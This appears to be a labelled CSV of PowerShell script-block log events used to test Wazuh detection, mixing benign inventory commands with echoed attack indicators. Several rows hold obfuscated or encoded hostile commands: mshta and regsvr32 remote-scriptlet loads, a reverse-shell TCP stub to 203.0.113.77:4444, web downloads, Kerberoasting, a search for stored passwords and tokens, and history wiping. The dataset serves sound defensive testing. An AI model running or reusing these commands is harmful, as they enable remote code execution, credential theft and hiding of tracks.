sample_id,declared_sample_id,mapping_status,source_line,channel,provider_name,computer,record_id,time_created_utc,event_id,scriptblock_id,message_number,message_total,dataset_fidelity_status,scriptblock_sha256,scriptblock_text
PST-231,PST-231,mapped,231,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723431,2026-07-17T09:37:20.0085655Z,4104,ec86409f-ce72-435b-a624-b99d9b368380,1,1,exact,e37cb4305c76b5305acd0991497208138bc0d8c4e2c64ed117093928392d19e3,"$sampleId='PST-231'; $settingText = 'Defender monitoring status read-only review'; Write-Output $settingText; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-232,PST-232,mapped,232,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723435,2026-07-17T09:37:20.4511047Z,4104,624e1e78-1348-469b-a37e-c7a1cbc2a814,1,1,exact,95ab760337b58cc0944e42d472dbb1f936739afb9774746e81ea24ebfc570ecb,"$sampleId='PST-232'; Get-Printer -ErrorAction SilentlyContinue | Select-Object -First 5 Name, DriverName; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-233,PST-233,mapped,233,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723486,2026-07-17T09:37:22.0797459Z,4104,5c285810-8c3e-4403-abb5-adb211fee028,1,1,exact,0b1f76cb3e8e4156919529053e4326f1ad0a3a46f150cb93f8a4ba4d9526dda7,"$sampleId='PST-233'; Write-Host ('Host: ' + $env:COMPUTERNAME + '; User: ' + $env:USERNAME); Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-234,PST-234,mapped,234,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723491,2026-07-17T09:37:22.7241668Z,4104,d1976d6d-1080-4999-ad1f-accee06ace24,1,1,exact,5fae44c2225ac16d42aeb030953a610b9d5983aaa7d9a7cf4d7feaafacfac357,"$sampleId='PST-234'; $encoded='SQBuAHYAbwBrAGUALQBLAGUAcgBiAGUAcgBvAGEAcwB0ACAALQBPAHUAdABwAHUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAsAEgAYQBzAGgA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-235,PST-235,mapped,235,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723505,2026-07-17T09:37:23.0644175Z,4104,470b5d33-388c-47e5-b3de-01a240faa562,1,1,exact,2fd32ee2ac9ad2f6bb7c761b1af47fe5a8c2b499796a19ea4a35470b62c3dfc1,"$sampleId='PST-235'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-236,PST-236,mapped,236,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723510,2026-07-17T09:37:23.8091307Z,4104,ba5ab3ec-bb53-4377-b216-389c115a38a2,1,1,exact,d1c87fa4b2fa56e81a4b5b7d80f07103daa8e28fb416025c5fe835b7a7331b6e,"$sampleId='PST-236'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-237,PST-237,mapped,237,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723514,2026-07-17T09:37:24.1336093Z,4104,93bfd346-2ff7-44c0-9cb7-0febd2843b26,1,1,exact,1aa5a7ca550cd004d9d71ce5d075d4a65a3b393e4ac08ecc562904da5199a5b5,"$sampleId='PST-237'; $PSVersionTable | Select-Object PSVersion, PSEdition; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-238,PST-238,mapped,238,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723517,2026-07-17T09:37:24.4608855Z,4104,f9d16cf3-ee04-49e0-8dfa-9505730ad82b,1,1,exact,19a982c7478f31588f21ab678538ab1984a89d6ab6d951354370aef1e82eedf9,"$sampleId='PST-238'; $indicator='mshta.exe jav`ascript:a=GetObject(''sc`ript:https://hta.ex`ample.inval`id/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-239,PST-239,mapped,239,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723521,2026-07-17T09:37:24.8020887Z,4104,2a49b10b-1599-4264-9aa5-d43e731705b6,1,1,exact,93283162b3a9d31e5bc6b5b9ea5e80d98a1d7e6084746499ece5266663e8e258,"$sampleId='PST-239'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-240,PST-240,mapped,240,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723523,2026-07-17T09:37:25.1422059Z,4104,eb27f89b-3b4b-4baa-8c55-fd2d40c234a3,1,1,exact,52f00524f5d2327bfe470418f7163d16ac8a438dec0070c770a1b68eaad238c4,"$sampleId='PST-240'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-241,PST-241,mapped,241,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723538,2026-07-17T09:37:25.4722318Z,4104,410ec2f5-f74f-49fd-a6dd-397751eb03e2,1,1,exact,16afea699b6674fb439251f2258d977aeae8acd56f4ec3afd5a3e3bb6cc02544,"$sampleId='PST-241'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-242,PST-242,mapped,242,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723546,2026-07-17T09:37:26.1261958Z,4104,c9fba75e-4259-4730-af86-b79b7d78ac7c,1,1,exact,38883bcb71e45d0babc191a59d32da6ee0008fafdca914bf0a28ec55e6d91e2d,"$sampleId='PST-242'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-243,PST-243,mapped,243,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723549,2026-07-17T09:37:26.6459959Z,4104,1a75b3e1-1ac3-4abd-b3e5-767d90e22a09,1,1,exact,768bdc18036bf8e5c34f10c7c468ebe1b015d6fe9a6669551070982e71a82198,"$sampleId='PST-243'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-244,PST-244,mapped,244,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723563,2026-07-17T09:37:26.9848542Z,4104,6d437857-fb91-4810-8f9d-0456cfc02384,1,1,exact,4b7417626892a9108721f8ca06b8e2c783c5a4d63adabdcf04725244b073a291,"$sampleId='PST-244'; [xml]$xml = '<inventory><host name=""ws-01""><state>ok</state></host></inventory>'; $xml.inventory.host.state; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-245,PST-245,mapped,245,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723565,2026-07-17T09:37:27.3171755Z,4104,a5895818-95ba-4d72-95e8-9a193d1f5c30,1,1,exact,2ec82b91b4d39d86e700602d4daed0111ba134331c5aaae84f03f81411bbf0c2,"$sampleId='PST-245'; $parts=@('regIsT`ER-SChEdu','LEDTaSK -ta`SKNAme ''','UPDaTECHeCk'' -act`I','oN (NEw-scHedUleDTaSKa','C`T`IOn -eX`eCuTe',' ''pOwe`rsHELl.exe'' -','ARg`uMeNT ''-nO`PrOFILE ','-enCOdeD`CO`mManD vWB','`YaGK`aDABlAC0atWB1','AHQa`CaB1AHQAiAa','naFqaSAbFaf`mA`SqBTAc0aS','qBoa`EuAuGbuaC`cA''',')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-246,PST-246,mapped,246,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723567,2026-07-17T09:37:27.6658078Z,4104,f3a9bc31-6cb3-487c-b252-72a55d8499a1,1,1,exact,a3a33ba558253c4d5fe1025805307aefd918fc5bc41c051fa1c2d3075814e3f1,"$sampleId='PST-246'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-247,PST-247,mapped,247,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723572,2026-07-17T09:37:27.9963770Z,4104,dbce3401-72c6-45dd-bafe-830b4347b64a,1,1,exact,84f99aa7cbdf6d38dfdf45bfa8a3cc25059eb435cb8c0215844c0e48ecd9c7ff,"$sampleId='PST-247'; $parts=@('Add-tYPE -MeMbe`Rd','`EFINiTion ''[DLLim`','PorT(""keRNeL32','.DlL"")] puBl','IC STa`tIc EXtERN',' in`TptR OpENprO','C`esS(uINT aCcE','sS, bool InhEr`it, ','Int pr`OCesSi','d);'' -nAme NAt`i','VemEt`hods -NA`','mEsPACE ThESIs.inEr','t'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-248,PST-248,mapped,248,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723574,2026-07-17T09:37:28.3245177Z,4104,7306863d-e4ca-42c8-88b0-dbb0ce7e632b,1,1,exact,e40f66572933088d9075160dcf949acd89a8a6506d1e5231cb6f98e4df471ba5,"$sampleId='PST-248'; $indicator='GeT-PRoCESs | selEcT-oBjECt nAme,Id,pATH'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-249,PST-249,mapped,249,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723576,2026-07-17T09:37:28.6659155Z,4104,2b512f82-2ddf-4216-ac4d-da861e15268b,1,1,exact,f1ff0606523884b0e9f96403c19452d3ca20117278a732c5c6293cf2dc49ea79,"$sampleId='PST-249'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-250,PST-250,mapped,250,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723595,2026-07-17T09:37:29.6154019Z,4104,0f5dccd9-3683-4050-81e4-24bed357738f,1,1,exact,77a969ae0f2da3b81ced205b346d80514ed1dcea4636034a83d2215fa4ffab23,"$sampleId='PST-250'; $indicator='regsvr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scrobj.dll'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-251,PST-251,mapped,251,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723599,2026-07-17T09:37:29.9675020Z,4104,cdce393f-0cc0-4412-83cf-310da9ddf7fb,1,1,exact,e89a57dee3426670b8cbbea6295d04776e26192fdf139ec5040b276cb8e488d5,"$sampleId='PST-251'; $encoded='QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-252,PST-252,mapped,252,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723602,2026-07-17T09:37:30.2890917Z,4104,169c867d-217d-41dd-a755-71bd05ef1aa8,1,1,exact,df9e031e7300ecfe41e6efd26cbf87fb07fc714a237d85bc43591570f8e0b783,"$sampleId='PST-252'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-253,PST-253,mapped,253,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723605,2026-07-17T09:37:30.6388652Z,4104,d10ffae6-571d-4d17-8df0-9914fbae822f,1,1,exact,c856b74775cee25fe6e876c38ef5d56767d529f2330966b4452cdc128ccfaadf,"$sampleId='PST-253'; $encoded='bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-254,PST-254,mapped,254,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723619,2026-07-17T09:37:30.9614355Z,4104,cce11f62-f3cd-45b2-89d4-e68bad374c81,1,1,exact,97f14cabbc5cb2811a11877b614eededb0bad898c0c6a33095af75c6324557ec,"$sampleId='PST-254'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-255,PST-255,mapped,255,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723622,2026-07-17T09:37:31.3003351Z,4104,f7d036d1-ab9d-46b0-a2ec-96d4746295c8,1,1,exact,f04b916fc4196b1c80ebd37b0c7e74149eaa2dd01b4c92c8d7ce84075741c7d9,"$sampleId='PST-255'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-256,PST-256,mapped,256,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723625,2026-07-17T09:37:31.6708090Z,4104,07756219-1a1b-44ed-a170-a43fd6ff3481,1,1,exact,eb62f96f66b1b5dc3eba4e0fd41a36bdbbd75f357565a48ede7aacd813a2105f,"$sampleId='PST-256'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-257,PST-257,mapped,257,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723631,2026-07-17T09:37:32.1995823Z,4104,7ee19e30-e3e8-4c3d-ab6b-7214d614159c,1,1,exact,7e9dd15548897a5664f6757f8e071b8a8a2768604b6ad8f9bb55fb32eba13960,"$sampleId='PST-257'; $parts=@('mSHTa.eXe j','avasCr','iPt:A=GeT','`OBJeCt(','''SCRi`P','T:HTtpS:/','/htA.exAMp','`le.InVAl','iD/A.SCt'').','eXEC();','cloSE()'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-258,PST-258,mapped,258,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723635,2026-07-17T09:37:32.5358231Z,4104,d754b8dc-f9a2-4fec-9bbf-0644e7a3ae13,1,1,exact,ad91396fe2a0ec228f7162a7214ca81270e96b753ebc7fa5980d15ed8ced765a,"$sampleId='PST-258'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-259,PST-259,mapped,259,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723650,2026-07-17T09:37:32.8825873Z,4104,777f38e1-2f11-43b1-94f9-4102447bafbf,1,1,exact,deb3267d10e7d9386ddb59ec898fb9e5d822192b4dffd46b778c35119dd603e6,"$sampleId='PST-259'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-260,PST-260,mapped,260,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723653,2026-07-17T09:37:33.3704560Z,4104,b671235a-bbd0-4d9b-83e9-ed17882d10ab,1,1,exact,5cfeed1ff5f0d5ea873a8d15acde9c68b9bc3b81f7070d088257ce2f63a6fe5d,"$sampleId='PST-260'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-261,PST-261,mapped,261,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723656,2026-07-17T09:37:33.7161761Z,4104,5d6701f4-dd21-4619-986f-ec5ad62c7e04,1,1,exact,8a9468ad41499e2ce909df87130611d58b23c1e53e1c5a0cd93937cb463446c9,"$sampleId='PST-261'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-262,PST-262,mapped,262,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723685,2026-07-17T09:37:35.8823154Z,4104,81991c6d-a367-42be-8803-02c1d3bf5a9f,1,1,exact,2cd75f41345502e2dd0590f8638fa639a7c8b030f5c4f27881e4607d0e0c4fcc,"$sampleId='PST-262'; $parts=@('invO`Ke','-REs`TmetHod ','-MeT`HoD pO','sT -Uri ''','httPS://API.','ex`amPlE.iN','V`AlId/Ch`EcKi','N'' -bOdY',' @{hosT=''wS-','01'';uSEr=''','AnA`LYSt'';stat','US=''o','K''}'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-263,PST-263,mapped,263,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723699,2026-07-17T09:37:36.2254158Z,4104,1acbd15d-3610-4b00-a3bb-328eedb71f7b,1,1,exact,435cf7b03abbeb45762be5f08e9d1d15c821a24434461d7310e5b880856a6dd6,"$sampleId='PST-263'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-264,PST-264,mapped,264,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723701,2026-07-17T09:37:36.5794184Z,4104,d5ca43ac-af77-49cf-86e8-8f8749567075,1,1,exact,317a5c0461ac86e642b273988452fd23d72dc4b6bdca38d0ac3aae38e848feb1,"$sampleId='PST-264'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-265,PST-265,mapped,265,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723703,2026-07-17T09:37:36.9054448Z,4104,62c8e103-1f5d-4e66-95d3-b4cf7743b2a0,1,1,exact,d791ce8950f0eeaa510bca2b7b4d025a90e1594f2623ed714d8dd27e314bf25f,"$sampleId='PST-265'; Get-Date | Select-Object DateTime; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-266,PST-266,mapped,266,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723706,2026-07-17T09:37:37.2337409Z,4104,1bef3a25-8ca0-45e9-87e9-baed5395dada,1,1,exact,f82394cffb796e1e0533ad2eeaf85d4ca8691453cc7c2c4e27d0cf12de4e23c1,"$sampleId='PST-266'; $parts=@('geT-cHildiT','`em -patH',' ''C:\uSers'' -','ReC`urSE',' -inCLuDE',' ''*.COnf`I','G'',''*.xml'' ','| seleCt-','sTRIng ','-pa`ttErn',' ''PaSSWOrd|toKE','N|Se`cr','ET'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-267,PST-267,mapped,267,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723710,2026-07-17T09:37:37.5644934Z,4104,bdd057e2-2774-4e2c-aa88-9996c0b259e1,1,1,exact,3f5e582a4d11fcfa905080b83781e1fc62cac958b69909c2b77d7da751652ac7,"$sampleId='PST-267'; $indicator='mshta.exe ja' + 'vascrip' + 't:a=GetO' + 'bject(''' + 'script' + ':https:/' + '/hta.exa' + 'mple.inva' + 'lid/a.sct'')' + '.Exec();clos' + 'e()'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-268,PST-268,mapped,268,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723713,2026-07-17T09:37:37.8897273Z,4104,53936a54-7164-4601-9ca5-2128e3156871,1,1,exact,5bf89f49200f3eab4624ac88c1ee3d2548a83ddea8f9532344ebfcae6e0b4b7b,"$sampleId='PST-268'; $indicator='Resolve-DnsN' + 'ame -Typ' + 'e TXT -Na' + 'me ''task' + '.example.' + 'invalid'' ' + '| Select-' + 'Object -Expan' + 'dProperty ' + 'Stri' + 'ngs'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-269,PST-269,mapped,269,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723717,2026-07-17T09:37:38.2245162Z,4104,cca28473-4c1f-44a7-90a0-0ae4b3a84a69,1,1,exact,d9275139e377380a41fbaf48d3c8c6d23ad63d8e1ab0838145db2099eb64cbe2,"$sampleId='PST-269'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-270,PST-270,mapped,270,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723730,2026-07-17T09:37:38.5604896Z,4104,bd3fc2b8-259f-4551-96c3-755e546a529d,1,1,exact,5864a0be488e5d7b3a7146aa6228b530833ff42a0ea071a4eaaac3722aa06188,"$sampleId='PST-270'; Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-271,PST-271,mapped,271,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723736,2026-07-17T09:37:39.1359317Z,4104,9ee2ee4f-f584-4fc9-9030-552e1c142678,1,1,exact,15083fc423fc15ada6d23b8ebfbdbf25c0cb0109ef55c81ab142cfd66792fb75,"$sampleId='PST-271'; $indicator='Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName,Hash'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-272,PST-272,mapped,272,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723739,2026-07-17T09:37:39.4667160Z,4104,3270e5a1-4946-4764-8972-8d2e78ccbbd9,1,1,exact,c19cebe24844a2cfd669060a3ce720ba0f8817841abc55c0aa8442995ffc1cd0,"$sampleId='PST-272'; $indicator='Invoke-RestMethod -Method Post -Uri ''https://api.example.invalid/checkin'' -Body @{host=''WS-01'';user=''analyst'';status=''ok''}'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-273,PST-273,mapped,273,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723754,2026-07-17T09:37:40.0527393Z,4104,24df1850-3fdb-40a1-b260-f4c0b3c1be4a,1,1,exact,d3ff7c77057c400d4c4b573c8f5a1b36f675428ff67182b93fd21f08f0872987,"$sampleId='PST-273'; $indicator='$CLiEnt=neW-ObjECt system.nET.sockEts.tCPclIenT(''203.0.113.77'',4444); $STreaM=$cLIenT.GETsTrEaM(); $BUfFEr=NEW-obJECT bytE[] 4096; $reAD=$StREAm.ReaD($bUffeR,0,$bUFfER.LENGTH)'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-274,PST-274,mapped,274,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723755,2026-07-17T09:37:40.3881583Z,4104,031487d1-fb24-4574-9ab9-72d118cffc89,1,1,exact,5053766929e39e901c2da73d3f90fafff493231582727306ff4c5612a6d3107a,"$sampleId='PST-274'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-275,PST-275,mapped,275,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723761,2026-07-17T09:37:40.8845994Z,4104,64563472-02af-42e5-ab74-2eac5a702739,1,1,exact,5bded3c379903cd79724da4a29434067c20b1749d6b6078e2ca5c4f16b3676a4,"$sampleId='PST-275'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-276,PST-276,mapped,276,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723764,2026-07-17T09:37:41.2283915Z,4104,26268c8b-5173-4595-83b3-fd1b67b0040d,1,1,exact,73e3821417035497c6232d465d83ca4fe9b7bb05d370345b92140402d43d228a,"$sampleId='PST-276'; Get-ExecutionPolicy -List; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-277,PST-277,mapped,277,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723767,2026-07-17T09:37:41.5653707Z,4104,f0d2c138-08de-4f0c-8628-7f970472744b,1,1,exact,4a8df1745abb6b65ffb9aa582ca745208d04cd30b798bca02215eeece80895da,"$sampleId='PST-277'; $indicator='$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::DefaultWebProxy; $wc.Headers[''User-Agent'']=''Mozilla/5.0''; $wc.DownloadString(''https://cdn.example.invalid/a'')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-278,PST-278,mapped,278,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723771,2026-07-17T09:37:41.9062337Z,4104,8db5ec58-baa2-437a-a12b-b2f8684ed453,1,1,exact,56960cc9010f12e38606baf6dfee985f41365126d6278eafe94d8777ade78188,"$sampleId='PST-278'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
